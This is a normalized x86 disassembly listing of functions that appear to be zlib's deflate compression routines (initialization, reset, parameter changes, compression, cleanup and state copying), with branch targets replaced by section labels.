sub_406389
push ebp
mov ebp esp
push 0xffffffff
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_4062c0
add esp 0x14
pop ebp
retn
sub_4063b0
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
push 0x0
push 0x8
push 0xf
push 0x8
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_4063d5
add esp 0x20
pop ebp
retn
sub_4063d5
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0xc ] 0x0
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov eax 0xfffffffa
jmp r-xdata
mov eax [ ebp + 0x20 ]
movsx ecx [ eax ]
mov edx [ rw-data ]
movsx eax [ edx ]
cmp ecx eax
jne r-xdata
mov esp ebp
pop ebp
retn
cmp [ ebp + 0x24 ] 0x38
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x18 ] 0x0
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x20 ] 0x0
jne r-xdata
mov eax 0xfffffffe
jmp r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] sub_4087de
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x28 ] 0x0
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x24 ] sub_408807
cmp [ ebp + 0x14 ] 0x0
jge r-xdata
mov [ ebp + 0xc ] 0x6
cmp [ ebp + 0x18 ] 0x1
jl r-xdata
mov [ ebp - 0xc ] 0x1
mov ecx [ ebp + 0x14 ]
neg ecx
mov [ ebp + 0x14 ] ecx
mov eax 0xfffffffe
jmp r-xdata
cmp [ ebp + 0x18 ] 0x9
jg r-xdata
cmp [ ebp + 0x10 ] 0x8
jne r-xdata
cmp [ ebp + 0x14 ] 0x8
jl r-xdata
cmp [ ebp + 0x14 ] 0xf
jg r-xdata
cmp [ ebp + 0xc ] 0x0
jl r-xdata
cmp [ ebp + 0xc ] 0x9
jg r-xdata
cmp [ ebp + 0x1c ] 0x0
jl r-xdata
cmp [ ebp + 0x1c ] 0x2
jle r-xdata
push 0x16b8
push 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x28 ]
push eax
mov ecx [ ebp + 0x8 ]
call [ ecx + 0x20 ]
add esp 0xc
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x1c ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ ecx ] edx
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov [ eax + 0x18 ] ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
mov [ edx + 0x28 ] eax
mov ecx [ ebp - 0x8 ]
mov edx 0x1
mov ecx [ ecx + 0x28 ]
shl edx cl
mov eax [ ebp - 0x8 ]
mov [ eax + 0x24 ] edx
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x24 ]
sub edx 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0x2c ] edx
mov ecx [ ebp + 0x18 ]
add ecx 0x7
mov edx [ ebp - 0x8 ]
mov [ edx + 0x48 ] ecx
mov eax [ ebp - 0x8 ]
mov edx 0x1
mov ecx [ eax + 0x48 ]
shl edx cl
mov eax [ ebp - 0x8 ]
mov [ eax + 0x44 ] edx
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x44 ]
sub edx 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4c ] edx
mov ecx [ ebp - 0x8 ]
mov eax [ ecx + 0x48 ]
add eax 0x2
xor edx edx
mov ecx 0x3
div ecx
mov edx [ ebp - 0x8 ]
mov [ edx + 0x50 ] eax
push 0x2
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x24 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x28 ]
push eax
mov ecx [ ebp + 0x8 ]
call [ ecx + 0x20 ]
add esp 0xc
mov edx [ ebp - 0x8 ]
mov [ edx + 0x30 ] eax
push 0x2
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x24 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x28 ]
push eax
mov ecx [ ebp + 0x8 ]
call [ ecx + 0x20 ]
add esp 0xc
mov edx [ ebp - 0x8 ]
mov [ edx + 0x38 ] eax
push 0x2
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x44 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x28 ]
push eax
mov ecx [ ebp + 0x8 ]
call [ ecx + 0x20 ]
add esp 0xc
mov edx [ ebp - 0x8 ]
mov [ edx + 0x3c ] eax
mov ecx [ ebp + 0x18 ]
add ecx 0x6
mov eax 0x1
shl eax cl
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x1694 ] eax
push 0x4
mov edx [ ebp - 0x8 ]
mov eax [ edx + 0x1694 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x28 ]
push edx
mov eax [ ebp + 0x8 ]
call [ eax + 0x20 ]
add esp 0xc
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ ecx + 0x8 ] edx
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x1694 ]
shl ecx 0x2
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax 0xfffffffc
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ rw-data ]
mov [ ecx + 0x18 ] edx
mov eax [ ebp + 0x8 ]
push eax
call sub_406ee5
add esp 0x4
mov eax 0xfffffffc
jmp r-xdata
mov ecx [ ebp - 0x8 ]
cmp [ ecx + 0x38 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
cmp [ edx + 0x3c ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x1694 ]
shr edx 0x1
mov eax [ ebp - 0x4 ]
lea ecx [ eax + edx * 2 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x169c ] ecx
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x1694 ]
imul ecx ecx 0x3
mov edx [ ebp - 0x8 ]
mov eax [ edx + 0x8 ]
add eax ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x1690 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx + 0x7c ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x1c ]
mov [ ecx + 0x80 ] edx
mov eax [ ebp - 0x8 ]
mov cl [ ebp + 0x10 ]
mov [ eax + 0x1d ] cl
mov edx [ ebp + 0x8 ]
push edx
call sub_406861
add esp 0x4
sub_4066c1
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] 0x0
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
cmp [ eax + 0x4 ] 0x2a
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x30 ]
push eax
call sub_408820
add esp 0xc
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x30 ] eax
cmp [ ebp - 0x8 ] 0x3
jae r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x24 ]
sub eax 0x106
cmp [ ebp - 0x8 ] eax
jbe r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x30 ]
push edx
call sub_40cb30
add esp 0xc
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov [ eax + 0x64 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x54 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x30 ]
xor eax eax
mov al [ edx ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x40 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ edx + 0x40 ]
mov ecx [ eax + 0x50 ]
shl edx cl
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x30 ]
xor eax eax
mov al [ ecx + 0x1 ]
xor edx eax
mov ecx [ ebp - 0x4 ]
and edx [ ecx + 0x4c ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x40 ] edx
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x24 ]
sub edx 0x106
mov [ ebp - 0x8 ] edx
mov eax [ ebp + 0x10 ]
sub eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
add ecx eax
mov [ ebp + 0xc ] ecx
mov edx [ ebp - 0x8 ]
sub edx 0x3
cmp [ ebp - 0x10 ] edx
ja r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov edx [ eax + 0x40 ]
mov ecx [ ecx + 0x50 ]
shl edx cl
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
xor ebx ebx
mov bl [ ecx + eax + 0x2 ]
xor edx ebx
mov ecx [ ebp - 0x4 ]
and edx [ ecx + 0x4c ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x40 ] edx
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
xor eax eax
mov ax [ ecx + edx * 2 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
and edx [ ecx + 0x2c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x38 ]
mov ax [ ebp - 0xc ]
mov [ ecx + edx * 2 ] ax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
mov ax [ ebp - 0x10 ]
mov [ ecx + edx * 2 ] ax
jmp r-xdata
xor eax eax
mov [ ebp - 0xc ] 0x0
mov ecx [ ebp - 0x10 ]
add ecx 0x1
mov [ ebp - 0x10 ] ecx
sub_406861
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x20 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x18 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x2c ] 0x2
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] 0x0
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x8 ]
mov [ ecx + 0x10 ] eax
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x18 ] 0x0
jge r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x18 ]
neg ecx
sbb ecx ecx
and ecx 0x47
add ecx 0x2a
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x30 ] 0x1
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x20 ] 0x0
mov edx [ ebp - 0x4 ]
push edx
call sub_408aa0
add esp 0x4
mov eax [ ebp - 0x4 ]
push eax
call sub_407242
add esp 0x4
xor eax eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] 0x0
sub_406932
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
mov [ ebp - 0x8 ] edx
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jl r-xdata
mov [ ebp + 0xc ] 0x6
mov eax 0xfffffffe
jmp r-xdata
cmp [ ebp + 0xc ] 0x9
jg r-xdata
cmp [ ebp + 0x10 ] 0x0
jl r-xdata
cmp [ ebp + 0x10 ] 0x2
jle r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x7c ]
imul ecx ecx 0xc
mov edx [ ecx + r--data ]
mov [ ebp - 0xc ] edx
mov eax [ ebp + 0xc ]
imul eax eax 0xc
mov ecx [ ebp - 0xc ]
cmp ecx [ eax + r--data ]
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x7c ]
cmp edx [ ebp + 0xc ]
je r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x8 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x10 ]
mov [ edx + 0x80 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax + 0x7c ] ecx
mov edx [ ebp + 0xc ]
imul edx edx 0xc
xor eax eax
mov ax [ edx + r--data ]
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x78 ] eax
mov edx [ ebp + 0xc ]
imul edx edx 0xc
xor eax eax
mov ax [ edx + r--data ]
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x84 ] eax
mov edx [ ebp + 0xc ]
imul edx edx 0xc
xor eax eax
mov ax [ edx + r--data ]
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x88 ] eax
mov edx [ ebp + 0xc ]
imul edx edx 0xc
xor eax eax
mov ax [ edx + r--data ]
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x74 ] eax
push 0x1
mov eax [ ebp + 0x8 ]
push eax
call sub_406a4e
add esp 0x8
mov [ ebp - 0x4 ] eax
sub_406a4e
push ebp
mov ebp esp
sub esp 0x14
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
cmp [ ebp + 0xc ] 0x4
jg r-xdata
cmp [ ebp + 0xc ] 0x0
jge r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ rw-data ]
mov [ ecx + 0x18 ] edx
mov eax 0xfffffffe
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x29a
jne r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x20 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
mov [ ecx + 0x20 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x2a
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ rw-data ]
mov [ ecx + 0x18 ] edx
mov eax 0xfffffffb
jmp r-xdata
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x14 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x28 ]
sub edx 0x8
shl edx 0x4
add edx 0x8
shl edx 0x8
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x7c ]
sub ecx 0x1
sar ecx 0x1
mov [ ebp - 0x10 ] ecx
cmp [ ebp - 0x10 ] 0x3
jbe r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_406e20
add esp 0x4
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0x10 ]
shl edx 0x6
mov eax [ ebp - 0xc ]
or eax edx
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x64 ] 0x0
je r-xdata
mov [ ebp - 0x10 ] 0x3
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x29a
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x20 ] 0xffffffff
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov ecx 0x1f
div ecx
mov eax 0x1f
sub eax edx
mov ecx [ ebp - 0xc ]
add ecx eax
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] 0x71
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
push ecx
call sub_406dd0
add esp 0x8
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x64 ] 0x0
je r-xdata
mov edx [ ebp - 0xc ]
or edx 0x20
mov [ ebp - 0xc ] edx
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x30 ] 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
shr ecx 0x10
push ecx
mov edx [ ebp - 0x4 ]
push edx
call sub_406dd0
add esp 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
and ecx 0xffff
push ecx
mov edx [ ebp - 0x4 ]
push edx
call sub_406dd0
add esp 0x8
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp - 0x4 ]
push edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x7c ]
imul ecx ecx 0xc
call [ ecx + r--data ]
add esp 0x8
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x2
je r-xdata
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x6c ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ edx + 0x18 ] eax
mov eax 0xfffffffb
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ rw-data ]
mov [ ecx + 0x18 ] edx
mov eax 0xfffffffb
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] 0x29a
cmp [ ebp - 0x14 ] 0x3
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x2
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x29a
je r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x20 ] 0xffffffff
cmp [ ebp - 0x14 ] 0x1
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x18 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x30 ]
shr eax 0x10
push eax
mov ecx [ ebp - 0x4 ]
push ecx
call sub_406dd0
add esp 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x30 ]
and eax 0xffff
push eax
mov ecx [ ebp - 0x4 ]
push ecx
call sub_406dd0
add esp 0x8
mov edx [ ebp + 0x8 ]
push edx
call sub_406e20
add esp 0x4
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0xffffffff
mov ecx [ ebp - 0x4 ]
xor eax eax
cmp [ ecx + 0x14 ] 0x0
sete al
mov eax 0x1
jmp r-xdata
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call sub_408c04
add esp 0x10
cmp [ ebp + 0xc ] 0x3
jne r-xdata
mov edx [ ebp - 0x4 ]
push edx
call sub_408d43
add esp 0x4
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_406e20
add esp 0x4
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x44 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
mov [ ecx + edx * 2 - 0x2 ] 0x0
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x44 ]
lea ecx [ eax + eax - 0x2 ]
push ecx
push 0x0
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x3c ]
push eax
call sub_40ce70
add esp 0xc
mov eax [ ebp - 0x4 ]
mov [ eax + 0x20 ] 0xffffffff
xor eax eax
jmp r-xdata
sub_406dd0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
shr eax 0x8
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x14 ]
mov [ edx + ecx ] al
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x14 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x14 ] eax
mov edx [ ebp + 0xc ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
pop ebp
retn
sub_406e20
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
mov edx [ ecx + 0x14 ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
cmp ecx [ eax + 0x10 ]
jbe r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x10 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
mov ecx [ eax + 0x10 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc ]
push eax
call sub_40cb30
add esp 0xc
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc ]
add edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0xc ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
mov eax [ edx + 0x10 ]
add eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
mov [ edx + 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x10 ]
sub ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x10 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
mov edx [ ecx + 0x14 ]
sub edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
mov [ ecx + 0x14 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
jmp r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
mov edx [ edx + 0x8 ]
mov [ ecx + 0x10 ] edx
sub_406ee5
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x2a
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
cmp [ edx + 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x71
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
cmp [ ecx + 0x3c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
mov edx [ ecx + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x28 ]
push ecx
mov edx [ ebp + 0x8 ]
call [ edx + 0x24 ]
add esp 0x8
cmp [ ebp - 0x4 ] 0x29a
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
mov ecx [ eax + 0x3c ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x28 ]
push eax
mov ecx [ ebp + 0x8 ]
call [ ecx + 0x24 ]
add esp 0x8
mov eax 0xfffffffe
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
cmp [ edx + 0x30 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
mov eax [ edx + 0x38 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x28 ]
push edx
mov eax [ ebp + 0x8 ]
call [ eax + 0x24 ]
add esp 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x28 ]
push eax
mov ecx [ ebp + 0x8 ]
call [ ecx + 0x24 ]
add esp 0x8
mov edx [ ebp + 0x8 ]
mov [ edx + 0x1c ] 0x0
xor eax eax
cmp [ ebp - 0x4 ] 0x71
setne al
dec eax
and al 0xfd
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
mov edx [ ecx + 0x30 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x28 ]
push ecx
mov edx [ ebp + 0x8 ]
call [ edx + 0x24 ]
add esp 0x8
sub_406ff6
push ebp
mov ebp esp
sub esp 0xc
push esi
push edi
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0xc ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x1c ]
mov [ ebp - 0x8 ] edx
mov esi [ ebp + 0xc ]
mov ecx 0xe
mov edi [ ebp + 0x8 ]
[ edi ] [ esi ]
push 0x16b8
push 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x28 ]
push ecx
mov edx [ ebp + 0x8 ]
call [ edx + 0x20 ]
add esp 0xc
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
mov [ eax + 0x1c ] ecx
mov edi [ ebp - 0xc ]
mov esi [ ebp - 0x8 ]
